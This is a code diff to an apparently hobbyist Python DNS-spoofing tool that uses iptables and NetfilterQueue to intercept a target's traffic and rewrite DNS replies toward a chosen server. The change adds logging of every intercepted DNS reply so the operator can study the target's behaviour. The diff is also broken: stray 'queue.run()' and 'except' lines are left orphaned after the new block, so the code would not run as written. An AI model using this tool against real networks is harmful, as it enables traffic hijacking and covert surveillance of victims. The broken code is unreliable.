@@ -3,6 +3,7 @@ from netfilterqueue import NetfilterQueue
 import os
 
 dns_hosts = {}
+dns_log_file_path = "dns_log.txt"
 
 
 def process_packet(packet):
@@ -11,6 +12,7 @@ def process_packet(packet):
     if scapy_packet.haslayer(DNSRR):
         # if the packet is a DNS Resource Record (DNS reply)
         # modify the packet
+        dns_log_file.write(scapy_packet.summary())
         print("[Before]:", scapy_packet.summary())
         try:
             scapy_packet = modify_packet(scapy_packet)
@@ -50,6 +52,7 @@ def modify_packet(packet):
 if __name__ == "__main__":
     # ask the user where server is located
     web_server = input("Enter the IP address of the server: ")
+    print("All of target's dns requests shall be logged in 'dns_log.txt', so you can analyze the target's behaviour")
 
     # ask the user which hosts he wants to spoof
     isDone = False
@@ -65,11 +68,17 @@ if __name__ == "__main__":
     os.system(f"sudo iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}")
     # instantiate the netfilter queue
     queue = NetfilterQueue()
+    with open(dns_log_file_path, 'w') as dns_log_file:
+        try:
+            # bind the queue number to our callback `process_packet`
+            # and start it
+            queue.bind(QUEUE_NUM, process_packet)
+            queue.run()
+        except KeyboardInterrupt:
+            # if want to exit, make sure we
+            # remove that rule we just inserted, going back to normal.
+            os.system("sudo iptables --flush")
 
-    try:
-        # bind the queue number to our callback `process_packet`
-        # and start it
-        queue.bind(QUEUE_NUM, process_packet)
         queue.run()
     except KeyboardInterrupt:
         # if want to exit, make sure we
